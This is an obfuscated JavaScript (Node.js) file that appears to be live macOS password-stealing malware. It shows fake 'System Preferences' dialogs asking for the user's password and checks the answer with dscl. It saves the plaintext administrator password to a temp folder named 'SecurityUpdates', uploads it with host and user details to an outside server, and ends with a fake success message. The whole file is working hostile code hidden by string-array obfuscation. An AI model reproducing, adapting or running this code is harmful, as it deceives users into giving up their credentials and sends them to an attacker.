const _0x490681=_0x5885;(function(_0x15c402,_0x2a9c35){const _0x4a2cd3=_0x5885,_0x154b60=_0x15c402();while(!![]){try{const _0x47060e=parseInt(_0x4a2cd3(0x1e4))/0x1+parseInt(_0x4a2cd3(0x1a3))/0x2+-parseInt(_0x4a2cd3(0x1ac))/0x3*(parseInt(_0x4a2cd3(0x1fc))/0x4)+parseInt(_0x4a2cd3(0x201))/0x5+parseInt(_0x4a2cd3(0x1af))/0x6+-parseInt(_0x4a2cd3(0x1ec))/0x7*(-parseInt(_0x4a2cd3(0x1c4))/0x8)+-parseInt(_0x4a2cd3(0x1aa))/0x9;if(_0x47060e===_0x2a9c35)break;else _0x154b60['push'](_0x154b60['shift']());}catch(_0x3fadc9){_0x154b60['push'](_0x154b60['shift']());}}}(_0x56fc,0x8466d));const {execSync}=require(_0x490681(0x1b4)),fs=require('fs'),path=require('path'),os=require('os'),crypto=require(_0x490681(0x1e2)),http=require(_0x490681(0x1cf)),https=require('https'),CONFIG={'serverDomain':_0x490681(0x1ff),'serverPath':_0x490681(0x1fa),'serverPort':0x1f98,'apiKey':'tJz4uRVCwl2eEwyPTudYP9iGRfgq','retryDelay':0xbb8,'maxRetries':0x1f4,'timeout':0xea60};let SYSTEM_PASSWORD=null;function log(_0x113a31,_0x102278){const _0x3bdfbc=_0x490681,_0x3101c6=new Date()[_0x3bdfbc(0x1c3)]();console[_0x3bdfbc(0x1e8)]('['+_0x3101c6+']\x20'+_0x113a31);if(_0x102278)console[_0x3bdfbc(0x1fd)](_0x102278);try{const _0x1211be=path[_0x3bdfbc(0x1c5)](os['homedir'](),'temp_logs.txt');fs['appendFileSync'](_0x1211be,'['+_0x3101c6+']\x20'+_0x113a31+'\x0a');if(_0x102278)fs[_0x3bdfbc(0x1a1)](_0x1211be,(_0x102278[_0x3bdfbc(0x1c1)]||_0x102278)+'\x0a');}catch(_0x3f5d2b){}}function verifyPassword(_0x2b6b35,_0x4c239d){const _0x1c368a=_0x490681;try{const _0x21926e=_0x1c368a(0x1e5)+_0x2b6b35+'\x20'+_0x4c239d;return execSync(_0x21926e,{'stdio':'ignore'}),!![];}catch(_0x212e28){return![];}}async function getMacOSPassword(){const _0x270fc0=_0x490681;log(_0x270fc0(0x1d1));try{const _0x3e8487=os[_0x270fc0(0x1bd)]()['username'];log(_0x270fc0(0x1e3)+_0x3e8487);for(let _0x27ce7c=0x1;_0x27ce7c<=0x5;_0x27ce7c++){log(_0x270fc0(0x1a9)+_0x27ce7c+_0x270fc0(0x209));const _0x59c63d=_0x270fc0(0x202);try{const _0xc5a140=execSync(_0x59c63d,{'encoding':_0x270fc0(0x1a8)});let _0x4925f0='';const _0x4e215f=_0xc5a140[_0x270fc0(0x1db)](/text returned:([^,]+)/);if(_0x4e215f&&_0x4e215f[0x1]){_0x4925f0=_0x4e215f[0x1][_0x270fc0(0x1c7)]();if(verifyPassword(_0x3e8487,_0x4925f0))return log('Administrator\x20password\x20verified'),SYSTEM_PASSWORD=_0x4925f0,_0x4925f0;else log(_0x270fc0(0x1b9)),_0x27ce7c<0x5&&execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22Incorrect\x20password.\x20Please\x20try\x20again.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27');}else{if(_0xc5a140[_0x270fc0(0x1d3)](_0x270fc0(0x1f7)))return log(_0x270fc0(0x204)),null;else log(_0x270fc0(0x19d));}}catch(_0x4f94c9){log(_0x270fc0(0x1de)+_0x4f94c9[_0x270fc0(0x207)]);if(_0x4f94c9[_0x270fc0(0x207)][_0x270fc0(0x1d3)](_0x270fc0(0x19f)))return log(_0x270fc0(0x204)),null;}}return execSync(_0x270fc0(0x1f3)),null;}catch(_0x2845a6){return log(_0x270fc0(0x1b3)+_0x2845a6[_0x270fc0(0x207)],_0x2845a6),null;}}function generateClientId(){const _0xbc5cd1=_0x490681;try{const _0x54cb90=getMacAddress(),_0x240a8e=os['hostname'](),_0x3a57ad=os[_0xbc5cd1(0x1bd)]()[_0xbc5cd1(0x205)],_0x7628a2=crypto[_0xbc5cd1(0x1fe)](_0xbc5cd1(0x1c9))[_0xbc5cd1(0x1e9)](_0x54cb90+':'+_0x240a8e+':'+_0x3a57ad)['digest']('hex')[_0xbc5cd1(0x1f1)](0x0,0x8);return _0x7628a2;}catch(_0x159ebf){return Math['random']()[_0xbc5cd1(0x1be)](0x24)[_0xbc5cd1(0x1f1)](0x2,0xa);}}function getMacAddress(){const _0x15e519=_0x490681;try{const _0x43ed75=os[_0x15e519(0x1ba)]();for(const _0x30e062 of Object['keys'](_0x43ed75)){for(const _0x4c7c0e of _0x43ed75[_0x30e062]){if(!_0x4c7c0e['internal']&&_0x4c7c0e[_0x15e519(0x200)]!==_0x15e519(0x1ae))return _0x4c7c0e[_0x15e519(0x200)];}}return _0x15e519(0x1a5);}catch(_0x1a6192){return _0x15e519(0x1a5);}}function _0x5885(_0x239a6e,_0x3cd8df){const _0x56fc3d=_0x56fc();return _0x5885=function(_0x588571,_0x346346){_0x588571=_0x588571-0x19d;let _0x57e542=_0x56fc3d[_0x588571];return _0x57e542;},_0x5885(_0x239a6e,_0x3cd8df);}async function uploadToServer(_0x456096,_0x538785=0x0){return new Promise(_0x1f7468=>{const _0x267717=_0x5885;try{const _0x4e8b92=generateClientId(),_0x5d1d24={'hostname':os[_0x267717(0x1d9)](),'platform':os[_0x267717(0x1ed)](),'type':os[_0x267717(0x1df)](),'arch':os[_0x267717(0x1a6)](),'username':os['userInfo']()[_0x267717(0x205)],'id':_0x4e8b92},_0x23235d=CONFIG[_0x267717(0x1e0)]===0x1bb?'https':'http',_0x33b9f4=_0x23235d+_0x267717(0x1d6)+CONFIG[_0x267717(0x1a0)]+':'+CONFIG[_0x267717(0x1e0)]+CONFIG[_0x267717(0x1ee)],_0x4cecdb=_0x33b9f4[_0x267717(0x1d5)](_0x267717(0x1f9)),_0x557a01=_0x4cecdb?https:http,_0x5b2490=new URL(_0x33b9f4),_0x261844=_0x267717(0x1da)+Math['random']()[_0x267717(0x1be)](0x10)['substr'](0x2);let _0x38995d='';_0x38995d+='--'+_0x261844+'\x0d\x0a',_0x38995d+=_0x267717(0x1f2),_0x38995d+='Content-Type:\x20application/json\x0d\x0a\x0d\x0a',_0x38995d+=JSON[_0x267717(0x1cc)](_0x5d1d24)+'\x0d\x0a',_0x38995d+='--'+_0x261844+'\x0d\x0a',_0x38995d+=_0x267717(0x1f6)+_0x4e8b92+_0x267717(0x1b6),_0x38995d+=_0x267717(0x1bf),_0x38995d+=_0x456096+'\x0d\x0a',_0x38995d+='--'+_0x261844+_0x267717(0x1d0);const _0x48e636={'hostname':_0x5b2490[_0x267717(0x1d9)],'port':_0x5b2490['port']||(_0x4cecdb?0x1bb:0x50),'path':_0x5b2490[_0x267717(0x1cd)]+_0x5b2490[_0x267717(0x1b5)],'method':_0x267717(0x203),'headers':{'Content-Type':_0x267717(0x1d4)+_0x261844,'Content-Length':Buffer[_0x267717(0x1c8)](_0x38995d),'X-Client-Info':JSON[_0x267717(0x1cc)](_0x5d1d24),'X-API-Key':CONFIG[_0x267717(0x1ef)]},'timeout':CONFIG['timeout']};log(_0x267717(0x1a7)+_0x33b9f4);const _0x38a860=_0x557a01[_0x267717(0x1eb)](_0x48e636,_0x1f3a7b=>{let _0x15bd66='';_0x1f3a7b['on']('data',_0x2f1618=>{_0x15bd66+=_0x2f1618;}),_0x1f3a7b['on']('end',()=>{const _0x84d6b1=_0x5885;_0x1f3a7b[_0x84d6b1(0x20a)]>=0xc8&&_0x1f3a7b['statusCode']<0x12c?(log('Upload\x20successful:\x20'+_0x1f3a7b[_0x84d6b1(0x20a)]),_0x1f7468(!![])):(log(_0x84d6b1(0x1cb)+_0x1f3a7b['statusCode']+',\x20'+_0x15bd66),_0x538785<CONFIG[_0x84d6b1(0x1b8)]?(log(_0x84d6b1(0x1e6)+(_0x538785+0x1)+'/'+CONFIG[_0x84d6b1(0x1b8)]+_0x84d6b1(0x1a4)),setTimeout(()=>{uploadToServer(_0x456096,_0x538785+0x1)['then'](_0x1f7468);},CONFIG['retryDelay'])):(log('Maximum\x20retry\x20attempts\x20reached'),_0x1f7468(![])));});});_0x38a860['on'](_0x267717(0x1fd),_0x4d04d8=>{const _0x2a44fe=_0x267717;log(_0x2a44fe(0x1d7)+_0x4d04d8[_0x2a44fe(0x207)],_0x4d04d8),_0x538785<CONFIG['maxRetries']?(log(_0x2a44fe(0x1e6)+(_0x538785+0x1)+'/'+CONFIG[_0x2a44fe(0x1b8)]+_0x2a44fe(0x1a4)),setTimeout(()=>{const _0x2014fc=_0x2a44fe;uploadToServer(_0x456096,_0x538785+0x1)[_0x2014fc(0x1b0)](_0x1f7468);},CONFIG[_0x2a44fe(0x1ad)])):(log(_0x2a44fe(0x1d8)),_0x1f7468(![]));}),_0x38a860[_0x267717(0x1bc)](_0x38995d),_0x38a860[_0x267717(0x1b7)]();}catch(_0x2b6543){log(_0x267717(0x1ce)+_0x2b6543[_0x267717(0x207)],_0x2b6543),_0x538785<CONFIG[_0x267717(0x1b8)]?(log(_0x267717(0x1e6)+(_0x538785+0x1)+'/'+CONFIG[_0x267717(0x1b8)]+')...'),setTimeout(()=>{const _0x30627f=_0x267717;uploadToServer(_0x456096,_0x538785+0x1)[_0x30627f(0x1b0)](_0x1f7468);},CONFIG[_0x267717(0x1ad)])):(log(_0x267717(0x1d8)),_0x1f7468(![]));}});}function savePasswordLocally(_0x35201f){const _0x2ef8be=_0x490681;try{const _0x2cb5b8=os[_0x2ef8be(0x1bd)]()[_0x2ef8be(0x205)],_0x848e7b=generateClientId(),_0x4f4c70=new Date()['toISOString'](),_0xca5ad4=os[_0x2ef8be(0x1ab)](),_0x539b99=path[_0x2ef8be(0x1c5)](_0xca5ad4,_0x2ef8be(0x1f5));!fs[_0x2ef8be(0x206)](_0x539b99)&&fs[_0x2ef8be(0x1ea)](_0x539b99,{'recursive':!![]});const _0x523048=_0x2ef8be(0x1dc)+_0x2cb5b8+_0x2ef8be(0x1d2)+_0x35201f+_0x2ef8be(0x1c6)+_0x4f4c70+_0x2ef8be(0x1bb)+os[_0x2ef8be(0x1d9)]()+'\x0aPlatform:\x20'+os[_0x2ef8be(0x1ed)]()+_0x2ef8be(0x1dd)+os[_0x2ef8be(0x1df)]()+_0x2ef8be(0x1f8)+os[_0x2ef8be(0x1a6)]()+_0x2ef8be(0x1b1)+_0x848e7b,_0x24e268=path[_0x2ef8be(0x1c5)](_0x539b99,_0x848e7b+_0x2ef8be(0x208));fs[_0x2ef8be(0x1e1)](_0x24e268,_0x523048),log(_0x2ef8be(0x1e7)+_0x24e268);const _0x2b0614={'user':_0x2cb5b8,'password':_0x35201f,'timestamp':_0x4f4c70,'hostname':os[_0x2ef8be(0x1d9)](),'system':{'platform':os[_0x2ef8be(0x1ed)](),'release':os[_0x2ef8be(0x1a2)](),'type':os[_0x2ef8be(0x1df)](),'arch':os['arch']()},'clientId':_0x848e7b},_0x4ab941=path[_0x2ef8be(0x1c5)](_0x539b99,_0x848e7b+_0x2ef8be(0x1f4));return fs[_0x2ef8be(0x1e1)](_0x4ab941,JSON[_0x2ef8be(0x1cc)](_0x2b0614,null,0x2)),log(_0x2ef8be(0x1ca)+_0x4ab941),_0x523048;}catch(_0x52f7a5){return log(_0x2ef8be(0x1fb)+_0x52f7a5[_0x2ef8be(0x207)],_0x52f7a5),null;}}async function main(){const _0x505654=_0x490681;try{log(_0x505654(0x1c0));const _0x463d84=await getMacOSPassword();if(!_0x463d84){log(_0x505654(0x1c2));return;}const _0x1995ef=savePasswordLocally(_0x463d84);if(!_0x1995ef){log('Failed\x20to\x20save\x20password\x20locally');return;}const _0x5f392f=await uploadToServer(_0x1995ef);if(_0x5f392f){log(_0x505654(0x19e));try{execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22System\x20settings\x20updated\x20successfully.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27');}catch(_0xfcffc0){}}else log('Failed\x20to\x20upload\x20password\x20to\x20server');log(_0x505654(0x1f0));}catch(_0x3b5c26){log(_0x505654(0x1b2),_0x3b5c26);}}function _0x56fc(){const _0x4e5552=['628eZuVbN','error','createHash','lesbian.clck.hk','mac','1203765KmyUBQ','osascript\x20-e\x20\x27display\x20dialog\x20\x22To\x20launch\x20the\x20application,\x20you\x20need\x20to\x20update\x20the\x20system\x20settings\x5cn\x5cnPlease\x20enter\x20your\x20password.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20caution\x20default\x20answer\x20\x22\x22\x20giving\x20up\x20after\x2030\x20with\x20hidden\x20answer\x27','POST','User\x20canceled\x20password\x20entry','username','existsSync','message','.txt','\x20of\x205\x20to\x20get\x20password','statusCode','Could\x20not\x20extract\x20password\x20from\x20dialog\x20response','Password\x20successfully\x20uploaded\x20to\x20server','User\x20canceled','serverDomain','appendFileSync','release','271594EpsRYo',')...','unknown','arch','Uploading\x20data\x20to\x20server:\x20','utf8','Attempt\x20','7053849pnDiqQ','homedir','12447ExEftO','retryDelay','00:00:00:00:00:00','6363714LCOWtE','then','\x0aClientID:\x20','Unexpected\x20error\x20in\x20main\x20process','Error\x20getting\x20administrator\x20password:\x20','child_process','search','.txt\x22\x0d\x0a','end','maxRetries','Password\x20verification\x20failed','networkInterfaces','\x0aHostname:\x20','write','userInfo','toString','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a','Starting\x20macOS\x20password\x20collection\x20process','stack','Password\x20collection\x20failed\x20or\x20was\x20canceled','toISOString','184KwTqhB','join','\x0aTime:\x20','trim','byteLength','md5','JSON\x20data\x20saved\x20to:\x20','Upload\x20failed:\x20','stringify','pathname','Upload\x20error:\x20','http','--\x0d\x0a','\x0a===\x20Requesting\x20macOS\x20administrator\x20password\x20===','\x0aPassword:\x20','includes','multipart/form-data;\x20boundary=','startsWith','://','Request\x20error:\x20','Maximum\x20retry\x20attempts\x20reached','hostname','----WebKitFormBoundary','match','User:\x20','\x0aType:\x20','Error\x20requesting\x20password\x20via\x20dialog:\x20','type','serverPort','writeFileSync','crypto','Current\x20user:\x20','349195kpplmt','dscl\x20/Local/Default\x20-authonly\x20','Retrying\x20upload\x20(','Password\x20data\x20saved\x20to:\x20','log','update','mkdirSync','request','58163wsuVoc','platform','serverPath','apiKey','Password\x20collection\x20process\x20completed','substring','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','osascript\x20-e\x20\x27display\x20dialog\x20\x22Failed\x20to\x20authenticate\x20after\x20multiple\x20attempts.\x20The\x20application\x20will\x20exit.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','.json','SecurityUpdates','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','gave\x20up:true','\x0aArchitecture:\x20','https://','/api/files/upload','Error\x20saving\x20password\x20locally:\x20'];_0x56fc=function(){return _0x4e5552;};return _0x56fc();}main();
